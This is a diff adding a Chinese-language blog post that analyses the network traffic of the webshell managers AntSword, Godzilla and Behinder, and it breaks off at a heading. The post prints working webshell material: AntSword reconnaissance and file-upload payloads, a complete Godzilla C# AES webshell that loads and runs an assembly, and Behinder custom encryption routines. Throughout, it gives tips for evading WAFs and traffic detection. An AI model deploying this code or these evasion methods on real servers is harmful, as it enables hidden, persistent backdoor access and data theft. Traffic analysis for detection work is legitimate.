@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="mayylu">
+
+
+
+    <meta name="description" content="学习是一种生活态度">
+
+
+
+<title>webshell流量分析 | mayylu&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/vue.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">webshell流量分析</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">二月 2, 2026&nbsp;&nbsp;</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/fileupload/">fileupload</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间搞渗透忘记切公司网了，被上面通报了，谁知道内访问外webshell也会被规则匹配呀，但是这也激起我的兴趣，没想到aes加密流量的木马也会被轻易识别出来。本文将对常用webshell管理工具的流量进行分析，并总结流量特征</p>
+<span id="more"></span>
+<h2 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h2><h3 id="正常操作流量分析"><a href="#正常操作流量分析" class="headerlink" title="正常操作流量分析"></a>正常操作流量分析</h3><p>这里以aspx木马进行分析，木马密码是mr6</p>
+<h4 id="测试连接"><a href="#测试连接" class="headerlink" title="测试连接"></a>测试连接</h4><p>开头和结尾会写入一串特殊字符当作命令执行结果和其他内容的分隔符<br>将执行内容进行base64编码，进行了一次嵌套，并且设置了编码类型防止返回内容乱码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Response.Write(&quot;d86&quot; + &quot;e49c&quot;);//开头</span><br><span class="line">var err: Exception;</span><br><span class="line">try &#123;</span><br><span class="line">    eval(System.Text.Encoding.GetEncoding(&quot;UTF-8&quot;).GetString(</span><br><span class="line">        System.Convert.FromBase64String(&quot;dmFyIGM9U3lzdGVtLklPLkRpcmVjdG9yeS5HZXRMb2dpY2FsRHJpdmVzKCk7UmVzcG9uc2UuV3JpdGUoU2VydmVyLk1hcFBhdGgoIi4iKSsiCSIpO2Zvcih2YXIgaT0wO2k8PWMubGVuZ3RoLTE7aSsrKVJlc3BvbnNlLldyaXRlKGNbaV1bMF0rIjoiKTtSZXNwb25zZS5Xcml0ZSgiCSIrRW52aXJvbm1lbnQuT1NWZXJzaW9uKyIJIik7UmVzcG9uc2UuV3JpdGUoRW52aXJvbm1lbnQuVXNlck5hbWUpOw==&quot;)</span><br><span class="line">    ), &quot;unsafe&quot;);</span><br><span class="line">&#125; catch(err) &#123;</span><br><span class="line">    Response.Write(&quot;ERROR:// &quot; + err.message);</span><br><span class="line">&#125;</span><br><span class="line">Response.Write(&quot;1516&quot; + &quot;bf323&quot;);//结尾</span><br><span class="line">Response.End();</span><br></pre></td></tr></table></figure>
+<p>Base64 解码的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var c = System.IO.Directory.GetLogicalDrives();//获取服务器所有逻辑驱动器盘符</span><br><span class="line">Response.Write(Server.MapPath(&quot;.&quot;) + &quot;\t&quot;);//输出当前网站物理路径 </span><br><span class="line">for(var i = 0; i &lt;= c.length - 1; i++)</span><br><span class="line">    Response.Write(c[i][0] + &quot;:&quot;);</span><br><span class="line">Response.Write(&quot;\t&quot; + Environment.OSVersion + &quot;\t&quot;);// 输出操作系统版本</span><br><span class="line">Response.Write(Environment.UserName); //输出当前运行用户名</span><br></pre></td></tr></table></figure>
+<p>返回内容：<br>d86e49cC:\BaiduNetdiskDownload**    C:D:E:    Microsoft Windows NT 6.3.9600.0    .NET v4.51516bf323</p>
+<p>也就是说测试连接就是获取一些系统信息，如果有返回则说明连接成功</p>
+<h4 id="跳转目录"><a href="#跳转目录" class="headerlink" title="跳转目录"></a>跳转目录</h4><p>蚁剑木马可以看成两部分<br>一部分就是加载器：用来定义编码类型，设置分割符，设置一些传参变量<br>一部分就是执行代码：放的是执行代码，使用base64编码</p>
+<p>下面功能介绍就只介绍执行代码的内容，加载器都一样<br>这里获取路径的base64编码信息被放在一个随机参数里，解码时需要去除前两个字母，有点不太明白为什么要多此一举</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var D=System.Text.Encoding.GetEncoding(&quot;UTF-8&quot;).GetString(System.Convert.FromBase64String(Request.Item[&quot;z6b556b3b67dbf&quot;].substr(2)));//路径</span><br><span class="line">var m=new System.IO.DirectoryInfo(D);</span><br><span class="line">var s=m.GetDirectories();// 获取所有子目录</span><br><span class="line">var P:String;</span><br><span class="line">var i;</span><br><span class="line">function T(p:String):String&#123;</span><br><span class="line">    return System.IO.File.GetLastWriteTime(p).ToString(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line">&#125;</span><br><span class="line">for(i in s)&#123;</span><br><span class="line">    P=D+s[i].Name;</span><br><span class="line">    Response.Write(s[i].Name+&quot;/\t&quot;+T(P)+&quot;\t0\t&quot;+(s[i].Attributes)+&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">s=m.GetFiles();// 获取所有文件</span><br><span class="line">for(i in s)&#123;</span><br><span class="line">    P=D+s[i].Name;</span><br><span class="line">    Response.Write(s[i].Name+&quot;\t&quot;+T(P)+&quot;\t&quot;+s[i].Length+&quot;\t&quot;+(s[i].Attributes)+&quot;\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> 对路径“E:\System Volume Information”的访问被拒绝。4c2fb</p>
+<h4 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h4><p>跟打开目录差不多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var P:String = System.Text.Encoding.GetEncoding(&quot;UTF-8&quot;).GetString(System.Convert.FromBase64String(Request.Item[&quot;z6b556b3b67dbf&quot;].substr(2)));</span><br><span class="line">var m = new System.IO.StreamReader(P, Encoding.Default);</span><br><span class="line">Response.Write(m.ReadToEnd());</span><br><span class="line">m.Close();</span><br></pre></td></tr></table></figure>
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>文件目录相关的就是使用base64加密开头两个随机单词，数据就是用16进制，返回1就是上传成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 1. 获取并解码文件路径参数</span><br><span class="line">var P:String = System.Text.Encoding.GetEncoding(&quot;GBK&quot;).GetString(System.Convert.FromBase64String(Request.Item[&quot;j9a43c7a0c7aa8&quot;].substr(2)));</span><br><span class="line">var Z:String = Request.Item[&quot;ld2103ad173a05&quot;];// 获取十六进制数据参数</span><br><span class="line">var B:byte[] = new byte[Z.Length/2];  // 每个十六进制字节占2字符</span><br><span class="line">for(var i = 0; i &lt; Z.Length; i += 2) &#123;</span><br><span class="line">    B[i/2] = byte(Convert.ToInt32(Z.Substring(i, 2), 16));  // 16进制转字节</span><br><span class="line">&#125;</span><br><span class="line">var fs:System.IO.FileStream = new System.IO.FileStream(// 以追加模式打开文件流</span><br><span class="line">    P,  // 文件路径</span><br><span class="line">    System.IO.FileMode.Append  // 追加模式</span><br><span class="line">);</span><br><span class="line">fs.Write(B, 0, B.Length);  // 写入所有数据</span><br><span class="line">fs.Close();  // 关闭流</span><br><span class="line">Response.Write(&quot;1&quot;);//  返回成功标志</span><br></pre></td></tr></table></figure>
+<p>1</p>
+<p>还有其他的功能其实都大相径庭，就不一一介绍了</p>
+<h3 id="蚁剑自带的流量混淆功能"><a href="#蚁剑自带的流量混淆功能" class="headerlink" title="蚁剑自带的流量混淆功能"></a>蚁剑自带的流量混淆功能</h3><h4 id="使用随机英语单词变量"><a href="#使用随机英语单词变量" class="headerlink" title="使用随机英语单词变量"></a>使用随机英语单词变量</h4><p>之前传参，传路径或者数据都是14位随机变量，<code>ld2103ad173a05=...</code>，开启之后就是<code>key=</code>,<code>hash=</code>,<code>continuous=</code>等等</p>
+<h4 id="使用mult传包"><a href="#使用mult传包" class="headerlink" title="使用mult传包"></a>使用mult传包</h4><p>默认发包方式为 application/x-www-form-urlencoded, 勾选此选项后将开启 Multipart 发包方式 multipart/form-data</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">content-type: multipart/form-data; boundary=--------------------------455780280277588953008747</span><br><span class="line">Content-Length: 719</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">----------------------------455780280277588953008747</span><br><span class="line">Content-Disposition: form-data; name=&quot;mr6&quot;</span><br><span class="line"></span><br><span class="line">Response.Write(&quot;5854ad&quot;+&quot;c8cd9d&quot;);var err:Exception;try&#123;eval(System.Text.Encoding.GetEncoding(&quot;GBK&quot;).GetString(System.Convert.FromBase64String(&quot;dmFyIGM9U3lzdGVtLklPLkRpcmVjdG9yeS5HZXRMb2dpY2FsRHJpdmVzKCk7UmVzcG9uc2UuV3JpdGUoU2VydmVyLk1hcFBhdGgoIi4iKSsiCSIpO2Zvcih2YXIgaT0wO2k8PWMubGVuZ3RoLTE7aSsrKVJlc3BvbnNlLldyaXRlKGNbaV1bMF0rIjoiKTtSZXNwb25zZS5Xcml0ZSgiCSIrRW52aXJvbm1lbnQuT1NWZXJzaW9uKyIJIik7UmVzcG9uc2UuV3JpdGUoRW52aXJvbm1lbnQuVXNlck5hbWUpOw==&quot;)),&quot;unsafe&quot;);&#125;catch(err)&#123;Response.Write(&quot;ERROR:// &quot;+err.message);&#125;Response.Write(&quot;2b38&quot;+&quot;296cf&quot;);Response.End();</span><br><span class="line">----------------------------455780280277588953008747--</span><br></pre></td></tr></table></figure>
+<h4 id="增加垃圾数据"><a href="#增加垃圾数据" class="headerlink" title="增加垃圾数据"></a>增加垃圾数据</h4><p>就是插一大顿没有用的变量，变量名是随机的，变量值也是随机的<br>因过多参数导致 WAF 获取不到后面的数据，从而达到 Bypass 目的。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>蚁剑因为shell载体是一句话，流量是代码混淆难度要比流量是字节码的shell管理器要高，而且不想冰蝎之类的可以一键生成shell,傻瓜式操作，你想要扩展shell加个流量加密功能，还得自己写shell，自己写编码器解码器。但是同时蚁剑也是扩展性比较好的工具，该有的基本功能都有，还支持插件</p>
+<h2 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h2><p>下面以哥斯拉的Cshap_AES_BASE64作为测试目标，进行流量分析，密码为默认值：pass,密钥为默认值：key</p>
+<h3 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">try &#123;</span><br><span class="line">    string key = &quot;3c6e0b8a9c15224a&quot;;//加密密钥为key,此处为加密密钥的MD5值的前16位</span><br><span class="line">    string pass = &quot;pass&quot;;//pass就是我们设置的密码</span><br><span class="line">    // 将pass+key组合后计算MD5，并移除连字符</span><br><span class="line">    string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace(&quot;-&quot;, &quot;&quot;);</span><br><span class="line">    byte[] data = System.Convert.FromBase64String(Context.Request[pass]);// 从请求参数pass中获取Base64编码的加密数据</span><br><span class="line">    //aes解码，密钥和iv皆为key的md5前16为</span><br><span class="line">    data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key),System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);</span><br><span class="line"></span><br><span class="line">    if (Context.Session[&quot;payload&quot;] == null) &#123;    // 检查Session中是否已加载payload</span><br><span class="line">        Context.Session[&quot;payload&quot;] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod(&quot;Load&quot;, new System.Type[] &#123; typeof(byte[]) &#125;).Invoke(null, new object[] &#123; data &#125;);// 首次请求：加载解密后的数据作为程序集</span><br><span class="line">    &#125; else &#123;// 后续请求</span><br><span class="line">        System.IO.MemoryStream outStream = new System.IO.MemoryStream();</span><br><span class="line">        object o = ((System.Reflection.Assembly)Context.Session[&quot;payload&quot;]).CreateInstance(&quot;LY&quot;);  // 从已加载的程序集中创建&quot;LY&quot;类的实例 </span><br><span class="line">        o.Equals(Context);      // 传递HttpContext</span><br><span class="line">        o.Equals(outStream);    // 传递输出流</span><br><span class="line">        o.Equals(data);         // 传递输入数据</span><br><span class="line">        o.ToString();           // 触发执行</span><br><span class="line">        byte[] r = outStream.ToArray();// 获取执行结果</span><br><span class="line">        </span><br><span class="line">        // 响应格式：MD5前16位 + Base64&amp;AES加密结果 + MD5后16位</span><br><span class="line">        Context.Response.Write(md5.Substring(0, 16));</span><br><span class="line">        Context.Response.Write(System.Convert.ToBase64String(</span><br><span class="line">            new System.Security.Cryptography.RijndaelManaged()</span><br><span class="line">                .CreateEncryptor(</span><br><span class="line">                    System.Text.Encoding.Default.GetBytes(key),</span><br><span class="line">                    System.Text.Encoding.Default.GetBytes(key))</span><br><span class="line">                .TransformFinalBlock(r, 0, r.Length)));</span><br><span class="line">        Context.Response.Write(md5.Substring(16));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (System.Exception) &#123;// 静默处理所有异常，不暴露任何错误信息</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>上述代码第一次请求，请求体经过base64和aes解码后其实是一个.NET程序集，里面有一个恶意类LY，第一次存储到<code>Session[&quot;payload&quot;]</code>中，后续请求就是从<code>Session[&quot;payload&quot;]</code>中获取恶意类，调用其中的方法。这其实算是中转马，先上传个小马然后在上传个大马</p>
+<h3 id="测试连接-1"><a href="#测试连接-1" class="headerlink" title="测试连接"></a>测试连接</h3><p>这个恶意的程序集在测试连接的时候被加载，我们可以解码后打包成dll文件，进行静态分析<br>那个dll文件太大了一千多行，这里就不一一分析了</p>
+<p>每次调用都先会调用的Equals方法和Tostring方法，Equals方法就是初始化一些全局变量，Tostring方法会调用run方法<br>在run方法会根据data传入的方法名调用方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">string text2 = this.get(&quot;methodName&quot;);</span><br><span class="line"> if (text == null)  // 如果evalClassName为null，则调用当前类中的方法</span><br><span class="line">        &#123;</span><br><span class="line">            MethodInfo method = base.GetType().GetMethod(text2, new Type[0]); // 从当前类型取指定方法</span><br><span class="line">            if (method != null &amp;&amp; method.ReturnType.IsAssignableFrom(typeof(byte[])))</span><br><span class="line">            &#123;</span><br><span class="line">                MethodBase methodBase = method;</span><br><span class="line">                object[] array = new Type[0]; </span><br><span class="line">                return (byte[])methodBase.Invoke(this, array);</span><br><span class="line">            &#125;</span><br><span class="line">            return this.stringToByteArray(&quot;method is null&quot;);  // 方法不存在</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>可见后续调用就是解析传入的字节数组，根据传入的methodName调用方法<br>测试连接时一共发了三个包，除了上面加载程序集，其他两个data包为<code>methodName close</code>和<code>methodName test</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public byte[] test()</span><br><span class="line">&#123;</span><br><span class="line">	return this.stringToByteArray(&quot;ok&quot;);</span><br><span class="line">&#125;</span><br><span class="line">public byte[] close()</span><br><span class="line">&#123;</span><br><span class="line">	byte[] result;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		this.sessionTable.Clear();</span><br><span class="line">		try</span><br><span class="line">		&#123;</span><br><span class="line">			this.httpContext.Session.Abandon();</span><br><span class="line">		&#125;</span><br><span class="line">		catch (Exception)</span><br><span class="line">		&#123;</span><br><span class="line">		&#125;</span><br><span class="line">		result = this.stringToByteArray(&quot;ok&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	catch (Exception ex)</span><br><span class="line">	&#123;</span><br><span class="line">		result = this.stringToByteArray(ex.Message);</span><br><span class="line">	&#125;</span><br><span class="line">	return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>test方法就是返回个ok表示加载成功，close方法就是清空session,相当于关闭连接</p>
+<h3 id="打开目录"><a href="#打开目录" class="headerlink" title="打开目录"></a>打开目录</h3><p>可见其传参也是通过字节数组传输的<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/ScreenShot_2026-01-30_174100_937.png" alt="ScreenShot_2026-01-30_174100_937"></p>
+<p>其实从流量这一方面讲也没什么好讲的，流量太小了，还进行aes加密非常的安全</p>
+<h3 id="混淆方法"><a href="#混淆方法" class="headerlink" title="混淆方法"></a>混淆方法</h3><p><code>https://github.com/BeichenDream/Godzilla/issues/87</code><br>还支持自定义请求头<br>可以看看作者大大说的，对于请求包可以自定义垃圾参数进行混淆，毕竟传参key值为<code>pass</code>其实也不是很明显<br>对于返回包也可以添加垃圾数据，有的人直接用生成好的木马，这样太明显了，俩16位的MD5里面夹着一个base64，它那俩MD5相当于分割符，所以你完全可以写个页面到木马里</p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>它的php jsp其实也差不多，都是把主要方法放进session里，然后像rpc一样调用就行了，并且加密用的非对称加密，换个密钥它就识别不出来了，缺点就是缺个一键添加垃圾数据的功能，对像我这样的脚本小子来说不是很友好(●’◡’●)，<br>还有就是在第一次连接的时候连发两个包，第一个包发一大堆数据，返回为空，第二个包发一个固定的数据，返回也是一个固定的数据，流量太明显了<br>最后就是没有做自定义的流量协议设计功能，想加什么编码协议都得自己反编译去改</p>
+<h2 id="冰蝎（v4版本）"><a href="#冰蝎（v4版本）" class="headerlink" title="冰蝎（v4版本）"></a>冰蝎（v4版本）</h2><p>冰蝎有两个比较明显的特点<br>其一是它传输介质是程序编译后的字节码，这是它的底层设计思想(php和asp因为不是编译型语言当然还是代码)<br>其二就是它可以自定义传输协议，这就大大提高了木马流量混淆能力的上线，我们不仅可以想哥斯拉一样添加一些垃圾数据，我们还可以对请求响应的加密 payload 进行自定义设计</p>
+<h3 id="编写传输协议"><a href="#编写传输协议" class="headerlink" title="编写传输协议"></a>编写传输协议</h3><p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/640.png" alt="640"><br>其中<br>本地加密为冰蝎客户端发送请求的加密算法<br>远程解密为shell脚本里处理请求的解密算法<br>远程加密为请求代码中对生成结果做的加密算法(并没有写死在shell里，但是跟在shell执行没什么区别)<br>本地解密为冰蝎客户端处理响应的解密算法</p>
+<p>其中本地加解密的环境是冰蝎客户端，所以编写语言应该是java<br>而远程加解密的环境是shell脚本,需要根据具体情况编写对应的脚本</p>
+<p>下面为自定义php的一句话木马，流量请求响应都为base64<br>本地加密请求包</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] Encrypt(<span class="keyword">byte</span>[] data) <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    String json=<span class="string">&quot;pass=lucky&quot;</span>;</span><br><span class="line">    json=json.replace(<span class="string">&quot;lucky&quot;</span>,java.util.Base64.getEncoder().encodeToString(data));</span><br><span class="line">    <span class="keyword">return</span> json.getBytes();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>远程解密请求包</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$prefix</span> = <span class="string">&quot;pass=&quot;</span>;<span class="comment">// 去掉开头的&quot;pass=&quot;前缀</span></span><br><span class="line">    <span class="keyword">if</span> (strpos(<span class="variable">$data</span>, <span class="variable">$prefix</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$data</span> = substr(<span class="variable">$data</span>, strlen(<span class="variable">$prefix</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_decode(<span class="variable">$data</span>);<span class="comment">// Base64解码并返回结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>远程加密响应包</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> base64_encode(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本地解密响应包</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] Decrypt(<span class="keyword">byte</span>[] data) <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">return</span> java.util.Base64.getDecoder().decode(data);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>生成的webshell</p>
